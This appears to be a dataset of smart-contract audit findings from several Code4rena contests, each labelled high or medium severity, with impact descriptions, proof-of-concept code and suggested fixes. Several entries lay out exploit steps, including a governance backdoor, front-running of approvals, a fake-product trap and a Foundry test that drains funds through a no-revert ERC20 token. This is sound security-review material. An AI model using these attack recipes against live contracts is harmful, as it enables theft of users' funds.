62.md,Business logic bug in __abdicate() function - 2 Bugs,high,"#### Impact

The `\__abdicate()` function at <https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L46-L50> is the logic to remove the governance i.e., to renounce governance. However, the function logic does not consider emergency governor and pending governor, which can be a backdoor as only the ""gov"" is set to zero address while the emergency and pending gov remains. A pending gov can just claim and become the gov again, replacing the zero address.

#### Proof of Concept

1.  Compile the contract and set the `\_GOVERNOR` and `\_EMERGENCY_GOVERNOR`.
2.  Now set a `pendingGov` but do not call `acceptGov()`

Bug 1
3. Call the `\__abdicate()` function and we will notice only ""gov"" is set to zero address while emergency gov remains.

Bug2
4. Now use the address used in `pendingGov` to call `acceptGov()` function.
5. We will notice the new gov has been updated to the new address from the zero address.

Hence the `\__abdicate()` functionality can be used as a backdoor using emergency governor or leaving a pending governor to claim later.

#### Tools Used

Remix to test the proof of concept.

#### Recommended Mitigation Steps

The `\__abdicate()` function should set `emergency_gov` and `pendingGov` as well to zero address."
62.md,ts.tokens sometimes calculated incorrectly,high,"#### Impact

Suppose someone stakes some tokens and then withdraws all of his tokens (he can still withdraw). This will result in ts.tokens being 0.

Now after some time he stakes some tokens again.
At the second stake `updateStream()` is called and the following if condition is false because `ts.tokens==0`

```JS
  if (acctTimeDelta > 0 && ts.tokens > 0) {
```

Thus `ts.lastUpdate` is not updated and stays at the value from the first withdraw.
Now he does a second withdraw. `updateStream()` is called an calculates the updated value of `ts.tokens`.
However it uses `ts.lastUpdate`, which is the time from the first withdraw and not from the second stake. So the value of `ts.token` is calculated incorrectly.
Thus more tokens can be withdrawn than you are supposed to be able to withdraw.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447>

```JS
function stake(uint112 amount) public lock updateStream(msg.sender) {
    ...         
    uint112 trueDepositAmt = uint112(newBal - prevBal);
    ... 
    ts.tokens += trueDepositAmt;
```

<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479>

```JS
function withdraw(uint112 amount) public lock updateStream(msg.sender) {
    ...
    ts.tokens -= amount;
```

<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250>

```JS
function updateStreamInternal(address who) internal {
...
uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;
    if (acctTimeDelta > 0 && ts.tokens > 0) {
        // some time has passed since this user last interacted
        // update ts not yet streamed
        ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
        ts.lastUpdate = uint32(block.timestamp);
    }
```

#### Recommended Mitigation Steps

Change the code in updateStream()  to:

```JS
if (acctTimeDelta > 0 ) {
    // some time has passed since this user last interacted
    // update ts not yet streamed
    if (ts.tokens > 0) 
            ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));
    ts.lastUpdate = uint32(block.timestamp);  // always update ts.lastUpdate (if time has elapsed)
}
```

Note: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas"
62.md,DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max,high,"#### Impact

<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229>

reverts due to overflow for higher values (but strictly less than type(uint112).max) and hence when user calls `exit` or `withdraw` function it will revert and that user will not able to withdraw funds permanentaly.

#### Proof of Concept

Attaching diff to modify tests to reproduce behaviour:

```
diff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol
index 2be8db0..aba19ce 100644
--- a/Streaming/src/test/Locke.t.sol
+++ b/Streaming/src/test/Locke.t.sol
@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {
         );
 
         testTokenA.approve(address(stream), type(uint256).max);
-        stream.fundStream((10**14)*10**18);
+        stream.fundStream(1000);
 
-        alice.doStake(stream, address(testTokenB), (10**13)*10**18);
+        alice.doStake(stream, address(testTokenB), 100);
 
 
         hevm.warp(startTime + minStreamDuration / 2); // move to half done
         
-        bob.doStake(stream, address(testTokenB), (10**13)*10**18);
+        bob.doStake(stream, address(testTokenB), 100);
 
         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);
 
@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {
         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream
 
 
-        // alice.doClaimReward(stream);
-        // assertEq(testTokenA.balanceOf(address(alice)), 533*(10**15));
-        // bob.doClaimReward(stream);
-        // assertEq(testTokenA.balanceOf(address(bob)), 466*(10**15));
+        alice.doClaimReward(stream);
+        assertEq(testTokenA.balanceOf(address(alice)), 533);
+        bob.doClaimReward(stream);
+        assertEq(testTokenA.balanceOf(address(bob)), 466);
     }
 
     function test_stake() public {
diff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol
index eb38060..a479875 100644
--- a/Streaming/src/test/utils/LockeTest.sol
+++ b/Streaming/src/test/utils/LockeTest.sol
@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {
         testTokenA = ERC20(address(new TestToken(""Test Token A"", ""TTA"", 18)));
         testTokenB = ERC20(address(new TestToken(""Test Token B"", ""TTB"", 18)));
         testTokenC = ERC20(address(new TestToken(""Test Token C"", ""TTC"", 18)));
-        write_balanceOf_ts(address(testTokenA), address(this), (10**14)*10**18);
-        write_balanceOf_ts(address(testTokenB), address(this), (10**14)*10**18);
-        write_balanceOf_ts(address(testTokenC), address(this), (10**14)*10**18);
-        assertEq(testTokenA.balanceOf(address(this)), (10**14)*10**18);
-        assertEq(testTokenB.balanceOf(address(this)), (10**14)*10**18);
+        write_balanceOf_ts(address(testTokenA), address(this), 100*10**18);
+        write_balanceOf_ts(address(testTokenB), address(this), 100*10**18);
+        write_balanceOf_ts(address(testTokenC), address(this), 100*10**18);
+        assertEq(testTokenA.balanceOf(address(this)), 100*10**18);
+        assertEq(testTokenB.balanceOf(address(this)), 100*10**18);
 
         defaultStreamFactory = new StreamFactory(address(this), address(this));
 
```

#### Tools Used

Manual Review

#### Recommended Mitigation Steps

Consider doing arithmetic operations in two steps or upcasting to u256 and then downcasting. Alternatively, find a threshold where it breaks and add require condition to not allow total stake per user greater than threshhold."
62.md,recoverTokens doesn't work when isSale is true,high,"#### Impact

In `recoverTokens`, the logic to calculate the excess number of deposit tokens in the contract is:

    uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);

This breaks in the case where isSale is true and the deposit tokens have already been claimed through the use of `creatorClaimSoldTokens`. In this case, `redemeedDepositTokens` will be zero, and `depositTokenAmount` will still be at its original value when the streaming ended. As a result, any attempts to recover deposit tokens from the contract would either revert or send less tokens than should be sent, since the logic above would still think that there are the full amount of deposit tokens in the contract. This breaks the functionality of the function completely in this case.

#### Proof of Concept

See the excess calculation here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654>

See `creatorClaimSoldTokens` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L583>

Notice that `creatorClaimSoldTokens` does not change `depositTokenAmount` or `redeemedDepositTokens`, so the excess calculation will be incorrect in the case of sales.

#### Tools Used

Inspection

#### Recommended Mitigation Steps

I would recommend setting `redeemedDepositTokens` to be `depositTokenAmount` in the function `creatorClaimSoldTokens`, since claiming the sold tokens is like ""redeeming"" them in a sense. This would fix the logic issue in `recoverTokens`."
62.md,LockeERC20 is vulnerable to frontrun attack,medium,"#### Impact

A user can steal another user's tokens if he frontrun before he changes the allowance.

The `approve()` function receives an amount to change to.
Lets say user A approved user B to take N tokens, and now he wants to change from N to M, if he calls `approve(M)` the attacker can frontrun, take the N tokens, wait until after the approve transaction, and take another M tokens. And taking N tokens more than the user wanted.

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

Change the approve function to either accept the old amount of allowance and require the current allowance to be equal to that, or change to two different functions that increase and decrease the allowance instead of straight on changing it."
62.md,Any arbitraryCall gathered airdrop can be stolen with recoverTokens,medium,"#### Impact

Any airdrop gathered with `arbitraryCall` will be immediately lost as an attacker can track `arbitraryCall` transactions and back run them with calls to `recoverTokens`, which doesn't track any tokens besides reward, deposit and incentive tokens, and will give the airdrop away.

#### Proof of Concept

`arbitraryCall` requires that tokens to be gathered shouldn't be reward, deposit or incentive tokens:
<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735>

Also, the function doesn't mark gathered tokens in any way. Thus, the airdrop is freely accessible for anyone to be withdrawn with `recoverTokens`:
<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L687>

#### Recommended Mitigation Steps

Add airdrop tokens balance mapping, record what is gathered in `arbitraryCall` and prohibit their free withdrawal in `recoverTokens` similarly to incentives\[].

Now:

```solidity
mapping (address => uint112) public incentives;
...
function recoverTokens(address token, address recipient) public lock {
...
		if (incentives[token] > 0) {
			...
			uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];
			...
		}

```

To be:
```solidity
mapping (address => uint112) public incentives;
mapping (address => uint112) public airdrops;
...
function recoverTokens(address token, address recipient) public lock {
...
    if (incentives[token] > 0) {
        ...
        uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];
        ...
    }
    if (airdrops[token] > 0) {
        ...
        uint256 excess = ERC20(token).balanceOf(address(this)) - airdrops[token];
        ...
    }
...
// we do know what airdrop token will be gathered
function arbitraryCall(address who, bytes memory data, address token) public lock externallyGoverned {
    ...

    // get token balances
    uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));
    uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));
    uint256 preAirdropBalance = ERC20(token).balanceOf(address(this));

    (bool success, bytes memory _ret) = who.call(data);
    require(success);
    
    uint256 postAirdropBalance = ERC20(token).balanceOf(address(this));
    require(postAirdropBalance <= type(uint112).max, ""air_112"");
    uint112 amt = uint112(postAirdropBalance - preAirdropBalance);
    require(amt > 0, ""air"");
    airdrops[token] += amt;
```"
62.md,This protocol doesn't support all fee on transfer tokens,medium,"Some fee on transfer tokens, do not reduce the fee directly from the transferred amount, but subtracts it from remaining balance of sender. Some tokens prefer this approach, to make the amount received by the recipient an exact amount. Therefore, after funds are send to users, balance becomes less than it should be. So this contract does not fully support fee on transfer tokens. With such tokens, user funds can get lost after transfers.

#### Mitigation step

I don't recommend directly claiming to support fee on transfer tokens. Current contract only supports them, if they reduce the fee from the transfer amount."
62.md,arbitraryCall() can get blocked by an attacker,medium,"#### Impact

`arbitraryCall()`'s (L733) use case is to claim airdrops by ""gov"". If the address ""who"" is a token that could be send as an incentive by an attacker via `createIncentive()` then such claim can be made unusable, because on L735 there is a `require(incentives\[who] == 0, ""inc"");` that reverts if a ""who"" token was received as an incentive.

In this case the the `incentives\[who]` can be set to 0 by the stream creator by calling `claimIncentive()` but only after the stream has ended according to `require(block.timestamp >= endStream, ""stream"");` (L520)

If the airdrop is only claimable before the end of the stream, then the airdrop can never be claimed.

If ""gov"" is not the stream creator then the stream creator must become also the ""gov"" because `claimIncentive()` only can be called by the stream creator and the `arbitraryCall()` only by ""gov"". If resetting `incentives\[who]` to 0 by calling `claimIncentive()` and `arbitraryCall()` for the ""who"" address doesn't happen atomic, an attacker can send between those two calls again a ""who"" token.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733>

- <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500>

#### Recommended Mitigation Steps

*   Best option at the moment I can think of is to accept the risk but clearly communicate to users that this can happen"
62.md,Storage variable unstreamed can be artificially inflated,medium,"#### Impact

The storage variable `unstreamed` keeps track of the global amount of deposit token in the contract that have not been streamed yet. This variable is a public variable, and users that read this variable likely want to use its value to determine whether or not they want to stake in the stream.

The issue here is that `unstreamed` is incremented on calls to `stake`, but it is not being decremented on calls to `withdraw`. As a result, a malicious user could simply stake, immediately withdraw their staked amount, and they will have increased `unstreamed`. They could do this repeatedly or with large amounts to intentionally inflate `unstreamed` to be as large as they want.

Other users would see this large amount and be deterred to stake in the stream, since they would get very little reward relative to the large amount of unstreamed deposit tokens that *appear* to be in the contract. This benefits the attacker as less users will want to stake in the stream, which leaves more rewards for them.

#### Proof of Concept

See `stake` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417>

See `withdraw` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455>

Notice that `stake` increments `unstreamed` but `withdraw` does not affect `unstreamed` at all, even though `withdraw` is indeed removing unstreamed deposit tokens from the contract.

#### Tools Used

Inspection

#### Recommended Mitigation Steps

Add the following line to `withdraw` to fix this issue:

    unstreamed -= amount;"
60.md,Wrong shortfall calculation,high,"Every time an account is settled, if shortfall is created, due to a wrong calculation shortfall will double in size and add the new shortfall.

#### Impact

Loss of funds: users won't be able to withdraw the correct amount of funds. Somebody would have to donate funds to resolve the wrong shortfall.

#### Proof of Concept

We can see in the `settleAccount` of `OptimisticLedger` that `self.shortfall` ends up being `self.shortfall+self.shortfall+newShortfall`: [(Code ref)](https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/collateral/types/OptimisticLedger.sol#L63:#L74)

```solidity
function settleAccount(OptimisticLedger storage self, address account, Fixed18 amount)
internal returns (UFixed18 shortfall) {
    Fixed18 newBalance = Fixed18Lib.from(self.balances[account]).add(amount);

    if (newBalance.sign() == -1) {
        shortfall = self.shortfall.add(newBalance.abs());
        newBalance = Fixed18Lib.ZERO;
    }

    self.balances[account] = newBalance.abs();
    self.shortfall = self.shortfall.add(shortfall);
}
```

Additionally, you can add the following line to the ""shortfall reverts if depleted"" test in `Collateral.test.js`, line 190:

```js
await collateral.connect(productSigner).settleAccount(userB.address, -50)
```

Previously the test product had 50 shortfall. Now we added 50 more, but the test will print that the actual shortfall is 150, and not 100 as it should be.

#### Recommended Mitigation Steps

Move the setting of `self.shortfall` to inside the if function and change the line to:
```
    self.shortfall = shortfall
```"
60.md,`withdrawTo` Does Not Sync Before Checking A Position's Margin Requirements,high,"#### Impact

The `maintenanceInvariant` modifier in `Collateral` aims to check if a user meets the margin requirements to withdraw collateral by checking its current and next maintenance. `maintenanceInvariant` inevitably calls `AccountPosition.maintenance` which uses the oracle's price to calculate the margin requirements for a given position. Hence, if the oracle has not synced in a long time, `maintenanceInvariant` may end up utilising an outdated price for a withdrawal. This may allow a user to withdraw collateral on an undercollaterized position.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/collateral/Collateral.sol#L67-L76>

```solidity
function withdrawTo(address account, IProduct product, UFixed18 amount)
notPaused
collateralInvariant(msg.sender, product)
maintenanceInvariant(msg.sender, product)
external {
    _products[product].debitAccount(msg.sender, amount);
    token.push(account, amount);

    emit Withdrawal(msg.sender, product, amount);
}
```
<https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/collateral/Collateral.sol#L233-L241>
```solidity
modifier maintenanceInvariant(address account, IProduct product) {
    _;

    UFixed18 maintenance = product.maintenance(account);
    UFixed18 maintenanceNext = product.maintenanceNext(account);

    if (UFixed18Lib.max(maintenance, maintenanceNext).gt(collateral(account, product)))
        revert CollateralInsufficientCollateralError();
}
```
<https://github.com/code-423n4/2021-12-perennial/blob/main/protocol/contracts/product/types/position/AccountPosition.sol#L71-L75>
```solidity
function maintenanceInternal(Position memory position, IProductProvider provider) private view returns (UFixed18) {
    Fixed18 oraclePrice = provider.priceAtVersion(provider.currentVersion());
    UFixed18 notionalMax = Fixed18Lib.from(position.max()).mul(oraclePrice).abs();
    return notionalMax.mul(provider.maintenance());
}
```
#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

Consider adding `settleForAccount(msg.sender)` to the `Collateral.withdrawTo` function to ensure the most up to date oracle price is used when assessing an account's margin requirements."
60.md,No checks if given product is created by the factory,medium,"An attacker can create a fake product. `Collateral` contract does not check whether the given product is created by the factory. A malicious product can return arbitrary maintenance amounts, therefore they can make any deposit to fake product stuck (simply return collateral - 1 as maintenance) and fake product owner can change the maintenance and liquidate whenever wanted and claim full collateral.

This is a serious attack vector, since by only interacting with `Collateral` contract the user can lose funds. Furthermore, this vulnerability poses big risks in combination web vulnerabilities. Users always have to check the product address to avoid getting scammed, but likely most users will only check the contract address.

Furthermore, if another protocol would want to add perennial protocol for its use case, the other protocol has to be careful with this behaviour and keep track of whitelisted products. This complicates adoption of perennial protocol, since whitelist has to be managed manually or else this vulnerability will likely be exploitable.

#### Mitigation step

Add a mapping inside `Collateral`, which verifies whether a product is created by factory or not. This mapping should get updated by the factory. This will add a little bit gas cost, but will eliminate a serious attack vector.

Or less gas efficient option is directly call a function from factory to verify."
60.md,Multiple initialization of Collateral contract,medium,"#### Impact

The attacker can initialize the contract, take malicious actions, and allow it to be re-initialized by the project without any error being noticed.

#### Proof of Concept

The `initialize` method of the`  Collateral ` contract does not contain the `initializer` modifier, it delegates this process to check if the factory is different from address(0) in the`  UFactoryProvider__initialize ` call, however the ` factory_  `is other than address(0), so an attacker could use front-running by listening to the memory pool, initialize the contract with a `factory=address(0)`, perform malicious actions, and still allow it to be started later by the I draft the contract without noticing any error.

Source reference:

*   Collateral.initialize

#### Tools Used

Manual review

#### Recommended Mitigation Steps

Use `initializer` modifier"
60.md,Chainlink's `latestRoundData` might return stale or incorrect results,medium,"<https://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/oracle/ChainlinkOracle.sol#L50-L60>

```solidity
function sync() public {
    (, int256 feedPrice, , uint256 timestamp, ) = feed.latestRoundData();
    Fixed18 price = Fixed18Lib.ratio(feedPrice, SafeCast.toInt256(_decimalOffset));

    if (priceAtVersion.length == 0 || timestamp > timestampAtVersion[currentVersion()] + minDelay) {
        priceAtVersion.push(price);
        timestampAtVersion.push(timestamp);

        emit Version(currentVersion(), timestamp, price);
    }
}
```

On `ChainlinkOracle.sol`, we are using `latestRoundData`, but there is no check if the return value indicates stale data. This could lead to stale prices according to the Chainlink documentation:

*   <https://docs.chain.link/docs/historical-price-data/#historical-rounds>
*   <https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>

#### Recommendation

Consider adding missing checks for stale data.

For example:

```solidity
(uint80 roundID, int256 feedPrice, , uint256 timestamp, uint80 answeredInRound) = feed.latestRoundData();
require(feedPrice > 0, ""Chainlink price <= 0""); 
require(answeredInRound >= roundID, ""Stale price"");
require(timestamp != 0, ""Round not complete"");
```"
57.md,`setGuardian()` Wrong implementation,high,"naz, 0x0x0x, and ksk2345_

[`IbbtcVaultZap.sol` L116-L119](https://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/6f700995129182fec81b772f97abab9977b46026/contracts/IbbtcVaultZap.sol#L116-L119)
```solidity
function setGuardian(address _guardian) external {
    _onlyGovernance();
    governance = _guardian;
}
```

[`SettToRenIbbtcZap.sol` L130-L133](https://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/a5c71b72222d84b6414ca0339ed1761dc79fe56e/contracts/SettToRenIbbtcZap.sol#L130-L133)

```solidity
function setGuardian(address _guardian) external {
    _onlyGovernance();
    governance = _guardian;
}
```

`governance = _guardian` should be `guardian = _guardian`."
57.md,Improper implementation of slippage check,medium,"[`Zap.sol` L216-L238](https://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L216-L238)

```solidity
function redeem(IERC20 token, uint amount, uint poolId, int128 idx, uint minOut)
    external
    defend
    blockLocked
    whenNotPaused
    returns(uint out)
{
    ibbtc.safeTransferFrom(msg.sender, address(this), amount);

    Pool memory pool = pools[poolId];
    if (poolId < 3) { // setts
        settPeak.redeem(poolId, amount);
        pool.sett.withdrawAll();
        pool.deposit.remove_liquidity_one_coin(pool.lpToken.balanceOf(address(this)), idx, minOut);
    } else if (poolId == 3) { // byvwbtc
        byvWbtcPeak.redeem(amount);
        IbyvWbtc(address(pool.sett)).withdraw(); // withdraws all available
    } else {
        revert(""INVALID_POOL_ID"");
    }
    out = token.balanceOf(address(this));
    token.safeTransfer(msg.sender, out);
}
```

In the current implementation of. `Zap.sol#redeem()`, the `outAmount` of `IbyvWbtc.withdraw()` is not controlled by `minOut`.

##### Recommendation
Consider implementing the `minOut` check in between L236 and L237.

```solidity
...
out = token.balanceOf(address(this));
require(out >= _minOut, ""Slippage Check"");
token.safeTransfer(msg.sender, out);
}
```"
57.md,Missing `_token.approve()` to `curvePool` in `setZapConfig`,medium,"[`SettToRenIbbtcZap.sol` L162-L183](https://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/8d265aacb905d30bd95dcd54505fb26dc1f9b0b6/contracts/SettToRenIbbtcZap.sol#L162-L183)

```solidity
function setZapConfig(
    uint256 _idx,
    address _sett,
    address _token,
    address _curvePool,
    address _withdrawToken,
    int128 _withdrawTokenIndex
) external {
    _onlyGovernance();

    require(_sett != address(0));
    require(_token != address(0));
    require(
        _withdrawToken == address(WBTC) || _withdrawToken == address(RENBTC)
    );

    zapConfigs[_idx].sett = ISett(_sett);
    zapConfigs[_idx].token = IERC20Upgradeable(_token);
    zapConfigs[_idx].curvePool = ICurveFi(_curvePool);
    zapConfigs[_idx].withdrawToken = IERC20Upgradeable(_withdrawToken);
    zapConfigs[_idx].withdrawTokenIndex = _withdrawTokenIndex;
}
```

In the current implementation, when `curvePool` or `token` got updated, `token` is not approved to `curvePool`, which will malfunction the contract and break minting.

##### Recommendation
Change to:

```solidity
function setZapConfig(
    uint256 _idx,
    address _sett,
    address _token,
    address _curvePool,
    address _withdrawToken,
    int128 _withdrawTokenIndex
) external {
    _onlyGovernance();

    require(_sett != address(0));
    require(_token != address(0));
    require(
        _withdrawToken == address(WBTC) || _withdrawToken == address(RENBTC)
    );

    if (zapConfigs[_idx].curvePool != _curvePool && _curvePool != address(0)) {
        IERC20Upgradeable(_token).safeApprove(
            _curvePool,
            type(uint256).max
        );
    }

    zapConfigs[_idx].sett = ISett(_sett);
    zapConfigs[_idx].token = IERC20Upgradeable(_token);
    zapConfigs[_idx].curvePool = ICurveFi(_curvePool);
    zapConfigs[_idx].withdrawToken = IERC20Upgradeable(_withdrawToken);
    zapConfigs[_idx].withdrawTokenIndex = _withdrawTokenIndex;
}
```"
57.md,Zap contract's `redeem()` function doesn't check which token the user wants to receive,medium,"#### Impact
In the `redeem()` function, the user can pass a token address. That's the token they receive in return for the ibbtc they give back. Because of missing address checks the user can provide any possible ERC20 token here without the function reverting.

Although it's not strictly specified in the code I expect that the user should only be able to redeem wBTC or renBTC tokens since they should also only be able to deposit those.

#### Proof of Concept
[`Zap.sol` L216-L238](https://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L216-L238)

#### Tools Used
Manual Analysis

#### Recommended Mitigation Steps
Verify that the passed token address is either wBTC or renbtc"
57.md,Excessive `require` makes the transaction fail unexpectedly,medium,"The check for `RENCRV_VAULT.blockLock` is only needed when `if (_amounts[1] > 0 || _amounts[2] > 0)`.

However, in the current implementation, the check is done at the very first, making transactions unrelated to `RENCRV_VAULT` fail unexpectedly if there is a prior transaction involved with `RENCRV_VAULT` in the same block.


[`IbbtcVaultZap.sol` L149-L199](https://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/8d265aacb905d30bd95dcd54505fb26dc1f9b0b6/contracts/IbbtcVaultZap.sol#L149-L199)
```solidity
function deposit(uint256[4] calldata _amounts, uint256 _minOut)
    public
    whenNotPaused
{
    // Not block locked by setts
    require(
        RENCRV_VAULT.blockLock(address(this)) < block.number,
        ""blockLocked""
    );
    require(
        IBBTC_VAULT.blockLock(address(this)) < block.number,
        ""blockLocked""
    );

    uint256[4] memory depositAmounts;

    for (uint256 i = 0; i < 4; i++) {
        if (_amounts[i] > 0) {
            ASSETS[i].safeTransferFrom(
                msg.sender,
                address(this),
                _amounts[i]
            );
            if (i == 0 || i == 3) {
                // ibbtc and sbtc
                depositAmounts[i] += _amounts[i];
            }
        }
    }

    if (_amounts[1] > 0 || _amounts[2] > 0) {
        // Use renbtc and wbtc to mint ibbtc
        // NOTE: Can change to external zap if implemented
        depositAmounts[0] += _renZapToIbbtc([_amounts[1], _amounts[2]]);
    }
    // ...
}
```"
57.md,No slippage control on `deposit` of `IbbtcVaultZap.sol`,medium,"#### Impact
There is no slippage control on `deposit` of `IbbtcVaultZap.sol`, which expose user to sandwich attack.

#### Proof of Concept
[`IbbtcVaultZap.sol` L174](https://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/6f700995129182fec81b772f97abab9977b46026/contracts/IbbtcVaultZap.sol#L174)
Any deposit can be sandwiched, especially when the pool is not balanced.

#### Recommended Mitigation Steps
Add a `minOut` in line with the mint function of other contacts, and pass it as a parameter on L174"
57.md,`calcMint` always return poolId=0 and idx=0,medium,"#### Impact
`calcMint` in Zap.sol always return poolId=0 and idx=0, while the docstring specified it should return the most optimal route instead. This will lead to suboptimal zap.

#### Proof of Concept
-[`Zap.sol` L156](https://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L156)"
122.md,no-revert-on-transfer ERC20 tokens can be drained,high,"109 and smiling_heretic_

<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L198-L200>

### Impact

Some ERC20 tokens don't throw but just return false when a transfer fails. This can be abused to trick the `createVault()` function to initialize the vault without providing any tokens. A good example of such a token is *ZRX*: [Etherscan code](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64)

When such a vault is initialized, another user can both buy and exercise the option without ever receiving any funds. The creator of the vault does receive the buyer's Ether tho. So it can cause a loss of funds.

### Proof of Concept

The trick is to create a vault with an ERC20 token but use ERC721 as the vault's type. Then, instead of calling `safeTransferFrom()` the function calls `transferFrom()` which won't catch the token returning false.

Here's a test that showcases the issue:

```solidity
// CreateVault.t.sol
    function testStealFunds() public {
        // address of 0x on mainnet
        address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
        vm.startPrank(babe);
        require(ERC20(t).balanceOf(babe) == 0);
        uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);
        // check that neither the Cally contract nor the vault creator
        // had any 0x tokens
        require(ERC20(t).balanceOf(babe) == 0);
        require(ERC20(t).balanceOf(address(c)) == 0);

        // check whether vault was created properly
        Cally.Vault memory v = c.vaults(vaultId);
        require(v.token == t);
        require(v.tokenIdOrAmount == 100);
        vm.stopPrank();
        // So now there's a vault for 100 0x tokens although the Cally contract doesn't
        // have any.
        // If someone buys & exercises the option they won't receive any tokens.
        uint premium = 0.025 ether;
        uint strike = 2 ether;
        require(address(c).balance == 0, ""shouldn't have any balance at the beginning"");
        require(payable(address(this)).balance > 0, ""not enough balance"");

        uint optionId = c.buyOption{value: premium}(vaultId);
        c.exercise{value: strike}(optionId);

        // buyer of option (`address(this)`) got zero 0x tokens
        // But buyer lost their Ether
        require(ERC20(t).balanceOf(address(this)) == 0);
        require(address(c).balance > 0, ""got some money"");
    }
```

To run it, you need to use forge's forking mode: `forge test --fork-url <alchemy/infura URL> --match testStealFunds`

### Recommended Mitigation Steps

I think the easiest solution is to use `safeTransferFrom()` when the token is of type ERC721. Since the transfer is at the end of the function there shouldn't be any risk of reentrancy. If someone passes an ERC20 address with type ERC721, the `safeTransferFrom()` call would simply fail since that function signature shouldn't exist on ERC20 tokens.





***"
122.md,Inefficiency in the Dutch Auction due to lower duration,high,"The vulnerability or bug is in the implementation of the function getDutchAuctionStrike()
The AUCTION_DURATION is defined as 24 hours, and consider that the dutchAuctionReserveStrike (or reserveStrike) will never be set to 0 by user.

Now if a vault is created with startingStrike value of 55 and reserveStrike of 13.5 , the auction price will drop from 55 to 13.5 midway at \~12 hours.
So, after 12 hours from start of auction, the rate will be constant at reserveStrike of 13.5, and remaining time of 12 hours of auction is a waste.

Some other examples :

    startStrike, reserveStrike, time-to-reach-reserveStrike
    55 , 13.5  , ~12 hours
    55 , 5     , ~16.7 hours
    55 , 1.5   , ~20 hours
    5  , 1.5   , ~11 hours

### Impact

The impact is high wrt Usability, where users have reduced available time to participate in the auction (when price is expected to change).
The vault-Creators or the option-Buyers may or may not be aware of this inefficiency, i.e., how much effective time is available for auction.

### Proof of Concept

Contract : Cally.sol
Function : getDutchAuctionStrike ()

### Recommended Mitigation Steps

The function getDutchAuctionStrike() can be modified such that price drops to the reserveStrike exactly at 24 hours from start of auction.

            /*
                delta = max(auctionEnd - currentTimestamp, 0)
                progress = delta / auctionDuration
                auctionStrike = progress^2 * (startingStrike - reserveStrike)             << Changes here
                strike = auctionStrike + reserveStrike                                    << Changes here
            */
            uint256 delta = auctionEndTimestamp > block.timestamp ? auctionEndTimestamp - block.timestamp : 0;
            uint256 progress = (1e18 * delta) / AUCTION_DURATION;
            uint256 auctionStrike = (progress * progress * (startingStrike-reserveStrike)) / (1e18 * 1e18);

            strike = auctionStrike + reserveStrike;






***"
122.md,"[WP-H0] Fake balances can be created for not-yet-existing ERC20 tokens, which allows attackers to set traps to steal funds from future users",high,"<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L158-L201>

